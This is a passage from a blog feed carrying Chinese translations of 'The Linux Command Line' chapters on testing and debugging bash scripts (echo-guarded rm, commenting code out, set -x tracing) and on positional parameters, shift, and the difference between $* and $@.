<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>测试是包括脚本在内的每种软件开发中的重要步骤。开源世界有句话，“尽早发布，频繁发布”，反映了这一事实。通过尽早和频繁发布，软件获得更多的使用和测试机会。经验表明，如果在开发周期的早期发现错误，找到错误并修复它会更容易，也更便宜。</p>
<p>在第26章，“自顶向下设计”中，我们看到了如何使用存根来验证程序流。从脚本开发的最早阶段开始，它们就是检查我们工作进展的有价值技术。</p>
<p>让我们看看之前显示的文件删除问题，看看如何为方便测试编码。测试原始代码片段将是危险的，因为它的目的是删除文件，但我们可以修改代码使测试安全。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [[ -d <span class="variable">$dir_name</span> ]]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">cd</span> <span class="variable">$dir_name</span>; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="built_in">rm</span> * <span class="comment"># 测试</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;无法cd到&#x27;<span class="variable">$dir_name</span>&#x27;&quot;</span> &gt;&amp;2</span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;没有这样的目录: &#x27;<span class="variable">$dir_name</span>&#x27;&quot;</span> &gt;&amp;2</span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">exit</span> <span class="comment"># 测试</span></span><br></pre></td></tr></table></figure>

<p>由于错误条件已经输出了有用的信息，我们不必添加任何内容。最重要的更改是在rm命令之前放置一个echo命令，允许显示命令及其扩展的参数列表，而不是实际执行该命令。这个更改允许安全执行代码。在代码片段的末尾，我们放置一个exit命令来结束测试，并防止脚本的其他部分被执行。根据脚本的设计，这是否需要将有所不同。</p>
<p>我们还包括一些注释，作为我们与测试相关变更的“标记”。这些可以帮助在测试完成时找到并删除更改。</p>
<h4 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h4><p>要进行有用的测试，开发和应用好的<em>测试用例</em>很重要。这是通过精心选择反映<em>边缘</em>和<em>角落</em>案例的输入数据或操作条件来完成的。在我们的代码片段中（这是简单的），我们想知道代码在三个特定条件下的表现：</p>
<ol>
<li>dir_name包含现有目录的名称。</li>
<li>dir_name包含不存在目录的名称。</li>
<li>dir_name为空。</li>
</ol>
<p>通过在这些条件下进行测试，实现了良好的<em>测试覆盖</em>。</p>
<p>就像设计一样，测试也是时间的函数。并不是每个脚本特性都需要广泛测试。这真的是决定什么最重要的问题。由于如果发生故障可能会造成极大的破坏，我们的代码片段在设计和测试过程中都值得仔细考虑。</p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>如果测试揭示了脚本的问题，下一步就是调试。“问题”通常意味着脚本以某种方式没有达到程序员的期望。如果是这样，我们需要仔细确定脚本实际上在做什么以及为什么。找到错误有时可能涉及大量的侦探工作。</p>
<p>一个设计良好的脚本将尝试提供帮助。它应该被防御性编程，以检测异常条件并向用户提供有用的反馈。然而，有时问题非常奇怪和意外，需要更多的技术。</p>
<h4 id="找到问题区域"><a href="#找到问题区域" class="headerlink" title="找到问题区域"></a>找到问题区域</h4><p>在一些脚本中，特别是长的脚本，有时用于隔离与问题相关的脚本区域是有用的。这可能不总是实际的错误，但隔离通常会提供对实际原因的洞察。一个用于隔离代码的技术是“注释掉”脚本的部分区域。例如，我们的文件删除片段可以被修改来确定是否删除的部分与错误相关。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [[ -d <span class="variable">$dir_name</span> ]]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">cd</span> <span class="variable">$dir_name</span>; <span class="keyword">then</span></span><br><span class="line">	  <span class="built_in">rm</span> *</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  	<span class="built_in">echo</span> <span class="string">&quot;无法cd到&#x27;<span class="variable">$dir_name</span>&#x27;&quot;</span> &gt;&amp;2</span><br><span class="line">	  <span class="built_in">exit</span> 1</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="comment"># else</span></span><br><span class="line"><span class="comment"># echo &quot;没有这样的目录: &#x27;$dir_name&#x27;&quot; &gt;&amp;2</span></span><br><span class="line"><span class="comment"># exit 1</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>通过在脚本的逻辑部分的每行开始处放置注释符号，我们防止该部分被执行。然后可以再次进行测试，以查看代码的移除是否对错误的行为有任何影响。</p>
<h4 id="追踪"><a href="#追踪" class="headerlink" title="追踪"></a>追踪</h4><p>错误通常是脚本内意外逻辑流的情况。也就是说，脚本的部分要么从未被执行，要么以错误的顺序或错误的时间被执行。要查看程序的实际流程，我们使用称为<em>追踪</em>的技术。</p>
<p>一种追踪方法涉及在脚本中放置信息性消息，以显示执行的位置。我们可以向我们的代码片段添加消息。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;准备删除文件&quot;</span> &gt;&amp;2</span><br><span class="line"><span class="keyword">if</span> [[ -d <span class="variable">$dir_name</span> ]]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">cd</span> <span class="variable">$dir_name</span>; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;正在删除文件&quot;</span> &gt;&amp;2</span><br><span class="line">    <span class="built_in">rm</span> *</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;无法cd到&#x27;<span class="variable">$dir_name</span>&#x27;&quot;</span> &gt;&amp;2</span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;没有这样的目录: &#x27;<span class="variable">$dir_name</span>&#x27;&quot;</span> &gt;&amp;2</span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;文件删除完成&quot;</span> &gt;&amp;2</span><br></pre></td></tr></table></figure>

<p>我们将消息发送到标准错误，以将它们与正常输出分开。我们也不缩进包含消息的行，这样当需要移除它们时更容易找到。</p>
<p>现在当脚本被执行时，可以看到文件删除已经被执行。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ deletion-script</span><br><span class="line">准备删除文件</span><br><span class="line">正在删除文件</span><br><span class="line">文件删除完成</span><br><span class="line">[me@linuxbox ~]$</span><br></pre></td></tr></table></figure>

<p>bash还提供了一种追踪方法，通过-x选项和带有-x选项的set命令实现。使用我们之前的trouble脚本，我们可以通过在第一行添加-x选项来激活整个脚本的追踪。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash -x</span></span><br><span class="line"><span class="comment"># trouble: 用于演示常见错误的脚本</span></span><br><span class="line">number=1</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$number</span> = 1 ]; <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;Number is equal to 1.&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;Number is not equal to 1.&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>执行时，结果看起来像这样：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ trouble</span><br><span class="line">+ number=1</span><br><span class="line">+ <span class="string">&#x27;[&#x27;</span> 1 = 1 <span class="string">&#x27;]&#x27;</span></span><br><span class="line">+ <span class="built_in">echo</span> <span class="string">&#x27;Number is equal to 1.&#x27;</span></span><br><span class="line">Number is equal to 1.</span><br></pre></td></tr></table></figure>

<p>启用追踪后，我们看到执行的命令及其应用的扩展。前导加号表示追踪的显示，以将它们与常规输出的行区分开来。加号是追踪输出的默认字符。它包含在PS4（提示字符串4）shell变量中。可以调整这个变量的内容，使提示更有用。这里，我们修改变量的内容以包括在脚本中执行追踪的当前行号。注意，需要使用单引号以防止在实际使用提示时进行扩展。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">export</span> PS4=<span class="string">&#x27;$LINENO + &#x27;</span></span><br><span class="line">[me@linuxbox ~]$ trouble</span><br><span class="line">5 + number=1</span><br><span class="line">7 + <span class="string">&#x27;[&#x27;</span> 1 = 1 <span class="string">&#x27;]&#x27;</span></span><br><span class="line">8 + <span class="built_in">echo</span> <span class="string">&#x27;Number is equal to 1.&#x27;</span></span><br><span class="line">Number is equal to 1.</span><br></pre></td></tr></table></figure>

<p>要在脚本的选定部分而不是整个脚本上执行追踪，我们可以使用带有-x选项的set命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># trouble: 用于演示常见错误的脚本</span></span><br><span class="line">number=1</span><br><span class="line"><span class="built_in">set</span> -x <span class="comment"># 开启追踪</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$number</span> = 1 ]; <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;Number is equal to 1.&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;Number is not equal to 1.&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">set</span> +x <span class="comment"># 关闭追踪</span></span><br></pre></td></tr></table></figure>

<p>我们使用带有-x选项的set命令来激活追踪，使用+x选项来停用追踪。这种技术可以用来检查一个有问题的脚本的多个部分。</p>
<h4 id="在执行期间检查值"><a href="#在执行期间检查值" class="headerlink" title="在执行期间检查值"></a>在执行期间检查值</h4><p>通常，与追踪一起，显示变量的内容以看到脚本在执行期间的内部工作是有用的。应用额外的echo语句通常就能完成这个任务。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># trouble: 用于演示常见错误的脚本</span></span><br><span class="line">number=1</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;number=<span class="variable">$number</span>&quot;</span> <span class="comment"># 调试</span></span><br><span class="line"><span class="built_in">set</span> -x <span class="comment"># 开启追踪</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$number</span> = 1 ]; <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;Number is equal to 1.&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;Number is not equal to 1.&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">set</span> +x <span class="comment"># 关闭追踪</span></span><br></pre></td></tr></table></figure>

<p>在这个简单的例子中，我们简单地显示变量number的值，并用注释标记添加的行，以便以后识别和移除。当观察脚本中的循环和算术行为时，这种技术特别有用。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在本章中，我们只看了在脚本开发过程中可能出现的一些问题。当然，还有更多。这里描述的技术将使发现大多数常见错误成为可能。调试是通过经验发展出来的一门精细的艺术，既在于知道如何避免错误（在整个开发过程中不断测试）也在于发现错误（有效使用追踪）。</p>
<h3 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h3><ul>
<li><p>维基百科有几篇关于语法和逻辑错误的短文章：</p>
<p><span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9TeW50YXhfZXJyb3I=">http://en.wikipedia.org/wiki/Syntax_error<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9Mb2dpY19lcnJvcg==">http://en.wikipedia.org/wiki/Logic_error<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p>有许多关于bash编程技术方面的在线资源：</p>
<p><span class="exturl" data-url="aHR0cDovL215d2lraS53b29sZWRnZS5vcmcvQmFzaFBpdGZhbGxz">http://mywiki.wooledge.org/BashPitfalls<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cDovL3RsZHAub3JnL0xEUC9hYnMvaHRtbC9nb3RjaGFzLmh0bWw=">http://tldp.org/LDP/abs/html/gotchas.html<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5nbnUub3JnL3NvZnR3YXJlL2Jhc2gvbWFudWFsL2h0bWxfbm9kZS9SZXNlcnZlZC1Xb3JkLUluZGV4Lmh0bWw=">http://www.gnu.org/software/bash/manual/html_node/Reserved-Word-Index.html<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p>David Wheeler对Unix文件名问题及如何编码shell脚本以处理它进行了出色的讨论：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZHdoZWVsZXIuY29tL2Vzc2F5cy9maWxlbmFtZXMtaW4tc2hlbGwuaHRtbA==">https://www.dwheeler.com/essays/filenames-in-shell.html<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p>对于真正重型的调试，有Bash调试器：</p>
<p><span class="exturl" data-url="aHR0cDovL2Jhc2hkYi5zb3VyY2Vmb3JnZS5uZXQv">http://bashdb.sourceforge.net/<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>位置参数</title>
    <url>/2024/05/32-positional-parameters/</url>
    <content><![CDATA[<h2 id="32-位置参数"><a href="#32-位置参数" class="headerlink" title="32 - 位置参数"></a>32 - 位置参数</h2><p>到目前为止，我们的程序中缺少的一个功能是接受和处理命令行选项和参数的能力。在本章中，我们将检查 shell 提供的特性，这些特性允许我们的程序获取命令行内容的访问权限。</p>
<span id="more"></span>

<h3 id="访问命令行"><a href="#访问命令行" class="headerlink" title="访问命令行"></a>访问命令行</h3><p>Shell 提供了一组称为<em>位置参数</em>的变量，这些变量包含命令行上的各个单词。这些变量命名为 0 到 9。可以通过以下方式演示它们：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># posit-param: 脚本查看命令行参数</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">\$0 = <span class="variable">$0</span></span></span><br><span class="line"><span class="string">\$1 = <span class="variable">$1</span></span></span><br><span class="line"><span class="string">\$2 = <span class="variable">$2</span></span></span><br><span class="line"><span class="string">\$3 = <span class="variable">$3</span></span></span><br><span class="line"><span class="string">\$4 = <span class="variable">$4</span></span></span><br><span class="line"><span class="string">\$5 = <span class="variable">$5</span></span></span><br><span class="line"><span class="string">\$6 = <span class="variable">$6</span></span></span><br><span class="line"><span class="string">\$7 = <span class="variable">$7</span></span></span><br><span class="line"><span class="string">\$8 = <span class="variable">$8</span></span></span><br><span class="line"><span class="string">\$9 = <span class="variable">$9</span></span></span><br><span class="line"><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<p>这是一个简单的脚本，用于显示变量 <code>$0-$</code>9 的值。当没有命令行参数执行时，结果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ posit-param</span><br><span class="line"><span class="variable">$0</span> = /home/me/bin/posit-param</span><br><span class="line"><span class="variable">$1</span> =</span><br><span class="line"><span class="variable">$2</span> =</span><br><span class="line"><span class="variable">$3</span> =</span><br><span class="line"><span class="variable">$4</span> =</span><br><span class="line"><span class="variable">$5</span> =</span><br><span class="line"><span class="variable">$6</span> =</span><br><span class="line"><span class="variable">$7</span> =</span><br><span class="line"><span class="variable">$8</span> =</span><br><span class="line"><span class="variable">$9</span> =</span><br></pre></td></tr></table></figure>

<p>即使没有提供参数，$0 始终包含命令行上出现的第一项，即正在执行的程序的路径名。当提供了参数时，我们看到以下结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ posit-param a b c d</span><br><span class="line"><span class="variable">$0</span> = /home/me/bin/posit-param</span><br><span class="line"><span class="variable">$1</span> = a</span><br><span class="line"><span class="variable">$2</span> = b</span><br><span class="line"><span class="variable">$3</span> = c</span><br><span class="line"><span class="variable">$4</span> = d</span><br><span class="line"><span class="variable">$5</span> =</span><br><span class="line"><span class="variable">$6</span> =</span><br><span class="line"><span class="variable">$7</span> =</span><br><span class="line"><span class="variable">$8</span> =</span><br><span class="line"><span class="variable">$9</span> =</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong> 实际上，您可以使用参数扩展访问超过九个参数。要指定大于九的数字，请将数字用大括号括起来，如 <code>$&#123;10&#125;、$</code>{55}、${211} 等。</p>
<h4 id="确定参数数量"><a href="#确定参数数量" class="headerlink" title="确定参数数量"></a>确定参数数量</h4><p>Shell 还提供了一个变量 $#，它包含命令行上的参数数量：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># posit-param: 脚本查看命令行参数</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">参数数量: <span class="variable">$#</span></span></span><br><span class="line"><span class="string">\$0 = <span class="variable">$0</span></span></span><br><span class="line"><span class="string">\$1 = <span class="variable">$1</span></span></span><br><span class="line"><span class="string">\$2 = <span class="variable">$2</span></span></span><br><span class="line"><span class="string">\$3 = <span class="variable">$3</span></span></span><br><span class="line"><span class="string">\$4 = <span class="variable">$4</span></span></span><br><span class="line"><span class="string">\$5 = <span class="variable">$5</span></span></span><br><span class="line"><span class="string">\$6 = <span class="variable">$6</span></span></span><br><span class="line"><span class="string">\$7 = <span class="variable">$7</span></span></span><br><span class="line"><span class="string">\$8 = <span class="variable">$8</span></span></span><br><span class="line"><span class="string">\$9 = <span class="variable">$9</span></span></span><br><span class="line"><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<p>这是结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ posit-param a b c d</span><br><span class="line">参数数量: 4</span><br><span class="line"><span class="variable">$0</span> = /home/me/bin/posit-param</span><br><span class="line"><span class="variable">$1</span> = a</span><br><span class="line"><span class="variable">$2</span> = b</span><br><span class="line"><span class="variable">$3</span> = c</span><br><span class="line"><span class="variable">$4</span> = d</span><br><span class="line"><span class="variable">$5</span> =</span><br><span class="line"><span class="variable">$6</span> =</span><br><span class="line"><span class="variable">$7</span> =</span><br><span class="line"><span class="variable">$8</span> =</span><br><span class="line"><span class="variable">$9</span> =</span><br></pre></td></tr></table></figure>

<h4 id="shift-–-获取许多参数的访问权限"><a href="#shift-–-获取许多参数的访问权限" class="headerlink" title="shift – 获取许多参数的访问权限"></a>shift – 获取许多参数的访问权限</h4><p>但是，当我们给程序提供大量参数时会发生什么，例如以下情况？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ posit-param *</span><br><span class="line">参数数量: 82</span><br><span class="line"><span class="variable">$0</span> = /home/me/bin/posit-param</span><br><span class="line"><span class="variable">$1</span> = addresses.ldif</span><br><span class="line"><span class="variable">$2</span> = bin</span><br><span class="line"><span class="variable">$3</span> = bookmarks.html</span><br><span class="line"><span class="variable">$4</span> = debian-500-i386-netinst.iso</span><br><span class="line"><span class="variable">$5</span> = debian-500-i386-netinst.jigdo</span><br><span class="line"><span class="variable">$6</span> = debian-500-i386-netinst.template</span><br><span class="line"><span class="variable">$7</span> = debian-cd_info.tar.gz</span><br><span class="line"><span class="variable">$8</span> = Desktop</span><br><span class="line"><span class="variable">$9</span> = dirlist-bin.txt</span><br></pre></td></tr></table></figure>

<p>在这个示例系统上，通配符 * 扩展成 82 个参数。我们如何处理这么多参数？Shell 提供了一种方法，尽管有些笨拙，来做到这一点。shift 命令导致每次执行时所有参数“下移一位”。实际上，通过使用 shift，只需要一个参数（除了 $0，它永远不会改变）就足够了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># posit-param2: 脚本显示所有参数</span></span><br><span class="line">count=1</span><br><span class="line"><span class="keyword">while</span> [[ <span class="variable">$#</span> -gt 0 ]]; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;参数 <span class="variable">$count</span> = <span class="variable">$1</span>&quot;</span></span><br><span class="line">  count=$((count +</span><br><span class="line"></span><br><span class="line"> <span class="number">1</span>))</span><br><span class="line">  <span class="built_in">shift</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>每次执行 shift 时，<code>$2 的值移动到 $</code>1，<code>$3 的值移动到 $</code>2，依此类推。$# 的值也减少了一。</p>
<p>在 posit-param2 程序中，我们创建了一个循环，评估剩余参数的数量，并且只要至少有一个参数，就继续循环。我们显示当前参数，每次循环迭代时增加变量 count 的值，以提供处理的参数数量的运行计数，并最后执行 shift 以使用下一个参数加载 $1。这是程序的工作情况：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ posit-param2 a b c d</span><br><span class="line">参数 1 = a</span><br><span class="line">参数 2 = b</span><br><span class="line">参数 3 = c</span><br><span class="line">参数 4 = d</span><br></pre></td></tr></table></figure>

<h4 id="简单应用"><a href="#简单应用" class="headerlink" title="简单应用"></a>简单应用</h4><p>即使没有 shift，也可以使用位置参数编写有用的应用程序。作为示例，这里是一个简单的文件信息程序：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># file-info: 简单文件信息程序</span></span><br><span class="line">PROGNAME=<span class="string">&quot;<span class="subst">$(basename <span class="string">&quot;<span class="variable">$0</span>&quot;</span>)</span>&quot;</span></span><br><span class="line"><span class="keyword">if</span> [[ -e <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> -e <span class="string">&quot;\n文件类型:&quot;</span></span><br><span class="line">  file <span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> -e <span class="string">&quot;\n文件状态:&quot;</span></span><br><span class="line">  <span class="built_in">stat</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$PROGNAME</span>: 用法: <span class="variable">$PROGNAME</span> file&quot;</span> &gt;&amp;2</span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>这个程序显示了指定文件的文件类型（由 file 命令确定）和文件状态（来自 stat 命令）。这个程序的一个有趣特点是 PROGNAME 变量。它被赋予了 basename “<code>$0&quot; 命令的结果值。basename 命令删除路径名的前导部分，只留下文件的基本名称。在我们的示例中，basename 删除了 $</code>0 参数中包含的路径名的前导部分，即我们示例程序的完整路径名。这个值在构造消息时很有用，比如程序末尾的使用消息。通过这种方式编码，脚本可以被重命名，消息会自动调整为包含程序的名称。</p>
<h4 id="在-Shell-函数中使用位置参数"><a href="#在-Shell-函数中使用位置参数" class="headerlink" title="在 Shell 函数中使用位置参数"></a>在 Shell 函数中使用位置参数</h4><p>就像位置参数用于向 shell 脚本传递参数一样，它们也可以用来向 shell 函数传递参数。为了演示，我们将 file_info 脚本转换为一个 shell 函数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">file_info</span></span> () &#123;</span><br><span class="line">  <span class="comment"># file_info: 函数显示文件信息</span></span><br><span class="line">  <span class="keyword">if</span> [[ -e <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\n文件类型:&quot;</span></span><br><span class="line">    file <span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\n文件状态:&quot;</span></span><br><span class="line">    <span class="built_in">stat</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$FUNCNAME</span>: 用法: <span class="variable">$FUNCNAME</span> file&quot;</span> &gt;&amp;2</span><br><span class="line">    <span class="built_in">return</span> 1</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在，如果一个脚本集成了 file_info shell 函数，并使用文件名参数调用该函数，参数将被传递给该函数。</p>
<p>有了这个能力，我们可以编写许多有用的 shell 函数，不仅可以在脚本中使用，还可以在我们的 .bashrc 文件中使用。</p>
<p>注意，PROGNAME 变量被更改为 shell 变量 FUNCNAME。shell 自动更新此变量以跟踪当前执行的 shell 函数。请注意，$0 始终包含命令行上的第一项的完整路径名（即，程序的名称），并不包含我们可能期望的 shell 函数的名称。</p>
<h3 id="批量处理位置参数"><a href="#批量处理位置参数" class="headerlink" title="批量处理位置参数"></a>批量处理位置参数</h3><p>有时候，将所有位置参数作为一个组管理是很有用的。例如，我们可能想要编写另一个程序的“包装器”。这意味着我们创建一个脚本或 shell 函数，简化了另一个程序的调用。在这种情况下，包装器提供了一系列复杂的命令行选项，然后将参数列表传递给底层程序。</p>
<p>Shell 为此目的提供了两个特殊参数。它们都扩展为位置参数的完整列表，但在相当微妙的方式上</p>
<p>有所不同。它们在表 32-1 中描述。</p>
<p><em>表 32-1: <code>$* 和 $</code>@ 特殊参数</em></p>
<table>
<thead>
<tr>
<th><strong>参数</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>$*</td>
<td>扩展为从 1 开始的位置参数列表。当用双引号包围时，它扩展为包含所有位置参数的双引号字符串，每个参数之间用 IFS shell 变量的第一个字符分隔（默认是空格字符）。</td>
</tr>
<tr>
<td>$@</td>
<td>扩展为从 1 开始的位置参数列表。当用双引号包围时，它将每个位置参数扩展为一个单独的单词，就好像它被双引号包围了一样。</td>
</tr>
</tbody></table>
<p>这是一个显示这些特殊参数操作的脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># posit-params3: 脚本演示 $* 和 $@</span></span><br><span class="line"><span class="function"><span class="title">print_params</span></span> () &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;\$1 = <span class="variable">$1</span>&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;\$2 = <span class="variable">$2</span>&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;\$3 = <span class="variable">$3</span>&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;\$4 = <span class="variable">$4</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">pass_params</span></span> () &#123;</span><br><span class="line">  <span class="built_in">echo</span> -e <span class="string">&quot;\n&quot;</span> <span class="string">&#x27;$* :&#x27;</span>; print_params $*</span><br><span class="line">  <span class="built_in">echo</span> -e <span class="string">&quot;\n&quot;</span> <span class="string">&#x27;&quot;$*&quot; :&#x27;</span>; print_params <span class="string">&quot;$*&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> -e <span class="string">&quot;\n&quot;</span> <span class="string">&#x27;$@ :&#x27;</span>; print_params <span class="variable">$@</span></span><br><span class="line">  <span class="built_in">echo</span> -e <span class="string">&quot;\n&quot;</span> <span class="string">&#x27;&quot;$@&quot; :&#x27;</span>; print_params <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">pass_params <span class="string">&quot;word&quot;</span> <span class="string">&quot;words with spaces&quot;</span></span><br></pre></td></tr></table></figure>

<p>在这个相当复杂的程序中，我们创建了两个参数：word 和 words with spaces，并将它们传递给 pass_params 函数。该函数反过来又使用 <code>$* 和 $</code>@ 这两个特殊参数的四种方法之一将它们传递给 print_params 函数。执行脚本时，揭示了差异。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ posit-param3</span><br><span class="line"> $* :</span><br><span class="line"><span class="variable">$1</span> = word</span><br><span class="line"><span class="variable">$2</span> = words</span><br><span class="line"><span class="variable">$3</span> = with</span><br><span class="line"><span class="variable">$4</span> = spaces</span><br><span class="line"> <span class="string">&quot;$*&quot;</span> :</span><br><span class="line"><span class="variable">$1</span> = word words with spaces</span><br><span class="line"><span class="variable">$2</span> =</span><br><span class="line"><span class="variable">$3</span> =</span><br><span class="line"><span class="variable">$4</span> =</span><br><span class="line"> <span class="variable">$@</span> :</span><br><span class="line"><span class="variable">$1</span> = word</span><br><span class="line"><span class="variable">$2</span> = words</span><br><span class="line"><span class="variable">$3</span> = with</span><br><span class="line"><span class="variable">$4</span> = spaces</span><br><span class="line"> <span class="string">&quot;<span class="variable">$@</span>&quot;</span> :</span><br><span class="line"><span class="variable">$1</span> = word</span><br><span class="line"><span class="variable">$2</span> = words with spaces</span><br><span 